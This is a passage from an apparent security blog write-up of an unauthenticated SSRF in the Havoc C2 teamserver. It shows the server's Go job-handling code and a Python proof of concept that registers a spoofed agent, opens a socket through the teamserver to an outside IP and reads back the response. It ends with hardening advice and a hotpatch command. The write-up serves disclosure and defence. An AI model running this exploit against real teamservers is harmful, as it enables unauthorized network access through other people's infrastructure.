</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">/* only send the data if there is something... */</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">Data</span>) &gt; <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>					<span style="color:#75715e">/* make a new job */</span>
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">job</span> = <span style="color:#a6e22e">Job</span>{
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">Command</span>: <span style="color:#a6e22e">COMMAND_SOCKET</span>,
</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">Data</span>: []<span style="color:#a6e22e">any</span>{
</span></span><span style="display:flex;"><span>							<span style="color:#a6e22e">SOCKET_COMMAND_WRITE</span>,
</span></span><span style="display:flex;"><span>							<span style="color:#a6e22e">SocktID</span>,
</span></span><span style="display:flex;"><span>							<span style="color:#a6e22e">Data</span>,
</span></span><span style="display:flex;"><span>						},
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>					<span style="color:#75715e">/* append the job to the task queue */</span>
</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">AddJobToQueue</span>(<span style="color:#a6e22e">job</span>)
</span></span></code></pre></div><p>To retrieve a job, let&rsquo;s go back to the <code>handleDemonAgent</code> function.  We can see that if the <code>Command</code> variable is <code>COMMAND_GET_JOB</code>, we will pass the <code>TaskDispatch</code> and the teamserver will perform a length check on the <code>JobQueue</code>.  If there are jobs for our agent, we can see a payload being built and written as a response.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">/* check if the agent exists. */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Teamserver</span>.<span style="color:#a6e22e">AgentExist</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">AgentID</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">CanIRead</span>(([]<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadType</span>{<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>}))) {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* The agent is sending us the result of a task */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Command</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">COMMAND_GET_JOB</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Parser</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">NewParser</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">ParseBytes</span>())
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">TaskDispatch</span>(<span style="color:#a6e22e">RequestID</span>, <span style="color:#a6e22e">Command</span>, <span style="color:#a6e22e">Parser</span>, <span style="color:#a6e22e">Teamserver</span>)
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">asked_for_jobs</span> = <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* if there is no job then just reply with a COMMAND_NOJOB */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">asked_for_jobs</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> len(<span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">JobQueue</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* if there is a job then send the Task Queue */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">job</span>     = <span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">GetQueuedJobs</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">payload</span> = <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">BuildPayloadMessage</span>(<span style="color:#a6e22e">job</span>, <span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">Encryption</span>.<span style="color:#a6e22e">AESKey</span>, <span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">Encryption</span>.<span style="color:#a6e22e">AESIv</span>)
</span></span><span style="display:flex;"><span>		)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// write the response to the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">Response</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">payload</span>)
</span></span></code></pre></div><p>Spoofed job retrieval looks something like this in python code.  This completes our unauthenticated full read SSRF!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_socket</span>(socket_id):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># COMMAND_GET_JOB / 1</span>
</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x01</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    request_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x09</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    header_data <span style="color:#f92672">=</span> command <span style="color:#f92672">+</span> request_id
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">+</span> len(header_data)
</span></span><span style="display:flex;"><span>    size_bytes <span style="color:#f92672">=</span> size<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    agent_header <span style="color:#f92672">=</span> size_bytes <span style="color:#f92672">+</span> magic <span style="color:#f92672">+</span> agent_id
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> agent_header <span style="color:#f92672">+</span> header_data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[***] Trying to poll teamserver for socket output...&#34;</span>)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(teamserver_listener_url, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[***] Read socket output successfully!&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!!!] Failed to read socket output - </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>text<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    command_id <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(r<span style="color:#f92672">.</span>content[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>], <span style="color:#e6db74">&#34;little&#34;</span>)
</span></span><span style="display:flex;"><span>    request_id <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(r<span style="color:#f92672">.</span>content[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>], <span style="color:#e6db74">&#34;little&#34;</span>)
</span></span><span style="display:flex;"><span>    package_size <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(r<span style="color:#f92672">.</span>content[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">12</span>], <span style="color:#e6db74">&#34;little&#34;</span>)
</span></span><span style="display:flex;"><span>    enc_package <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>content[<span style="color:#ae81ff">12</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decrypt(AES_Key, AES_IV, enc_package)[<span style="color:#ae81ff">12</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xDEADBEEF</span>
</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>teamserver_listener_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.32&#34;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>agent_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100000</span>, <span style="color:#ae81ff">1000000</span>))
</span></span><span style="display:flex;"><span>AES_Key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>AES_IV <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DESKTOP-7F61JT1&#34;</span>
</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;neo&#34;</span>
</span></span><span style="display:flex;"><span>domain_name <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;MRTX&#34;</span>
</span></span><span style="display:flex;"><span>internal_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;10.1.33.7&#34;</span>
</span></span><span style="display:flex;"><span>process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;msedge.exe&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-16le&#34;</span>)
</span></span><span style="display:flex;"><span>process_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">5000</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>socket_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x11\x11\x11</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>open_socket(socket_id, <span style="color:#e6db74">&#34;44.221.186.72&#34;</span>, <span style="color:#ae81ff">80</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>request_data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;GET /vulnerable HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: www.example.com</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>write_socket(socket_id, request_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(read_socket(socket_id)<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><h3 id="takeaways">Takeaways</h3>
<p>Authenticate your beacons <br>
Apply heavy network restrictions on your teamserver (especially if you are running it on prem because someone can leak your IP)</p>
<h3 id="hotpatch">Hotpatch</h3>
<p>To hotpatch your teamserver:</p>
<ol>
<li>Navigate to the Havoc directory</li>
<li>Run the command</li>
</ol>
<pre tabindex="0"><code>sed -i &#39;/case COMMAND_SOCKET:/,/return true/d&#39; teamserver/pkg/agent/agent.go 
</code></pre><ol start="3">
<li>Rebuild the teamserver</li>
</ol>
<pre tabindex="0"><code>make ts-build
</code></pre>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
